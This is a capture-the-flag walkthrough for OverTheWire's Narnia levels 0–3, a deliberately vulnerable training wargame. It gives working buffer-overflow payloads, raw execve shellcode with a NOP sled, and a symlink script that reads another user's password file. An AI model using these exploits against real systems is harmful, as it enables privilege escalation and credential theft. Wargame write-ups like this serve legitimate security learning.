# Binary Exploitation/Pwn challenges from OverTheWire

## Narnia0

We have a `char buf[20]` buffer, but the input is taken as `scanf("%24s",&buf);` and we know that the shell is only executed when the val is at **0xdeadbeef**.

We build the hex address: "\xef\xbe\xad\xde" and with `cat -` we hold the shell open:

```bash
(python -c 'print("A"*20+"\xef\xbe\xad\xde")'; cat -; ) | ./narnia0
```

## Narnia1

This time the code reads from the `env` the variable. We have to set EGG as a shellcode.
We can pick any shellcode from [here](https://www.exploit-db.com/shellcodes):  

```bash
export EGG=`python -c 'print "<shellcode>"'`

./narnia1
```

## Narnia2

The buffer is `char buf[128]` and the function we will exploit will be `strcpy(buf,argv[1]);`.
In order to see where is the range of address we can fall in using a **NOP-Sled**, first of all we have to fill the buffer with 128 "A", inside GDB.
Note the breakpoint at *strcpy*

```console
narnia2@narnia:~$ gdb narnia2
```

```bash
b strcpy
run $(python -c 'print 128 * "A" + "BBBB"+ "CCCC"') #where B is the $ebp and C is the ret address
x/700xw $esp #analyzing the stack to detect "AAAA" B(41414141)
```

With GDB we see that in the stack we have "CCCC" in the **return address** of strcpy, then here we will put our middle-address of the  **NOP-Sled**. Again, any [shellcode](https://www.exploit-db.com/shellcodes/47513) can be used if it is small enough to fit into the NOPs.

`shellcode="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"`

`return address="\x4c\xd8\xff\xff"`

Number of NOPs = **128**(buff) - **25**(shellcode) + **4**($ebp) = 107

Let's run the program with:

```bash
./narnia2 $(python -c 'print 107 * "\x90" + "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"+"\x4c\xd8\xff\xff"')
```

## Narnia3

In the stack are allocated `char ofile[16] = "/dev/null"` and `char ifile[32]` and there is also a `strcpy(ifile, argv[1])` that copies in ifile argv[1]. Looking at the stack we can see that the two buffers are one above the other, then writing to **ifile** (strcpy doesn't check the length) also **ofile** can be written.
You can analyze the stack using:

```console
narnia3@narnia:~$ gdb narnia3
```

`run AAAAAAAAAAAAAAAAAAAAAAAAAAA`
`b open@plt`
`x/700xw $esp`

argv[1] will be:
`/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/yourfile`

Now you can set up your files and folder in your filesystem:

**Copy this in /tmp/yourscript.sh**

```bash
#!/bin/bash

mkdir /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/

touch /tmp/yourfile

chmod 777 /tmp/yourfile

ln -s /etc/narnia_pass/narnia4 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/yourfile

/narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/yourfile

cat /tmp/yourfile
```

>The directory "AAAAAAAAAAAAAAAAAAAAAAAAAAA" could be already created due to the number of the players in the server. You can create your own 32-bytes long directory with any character you want.
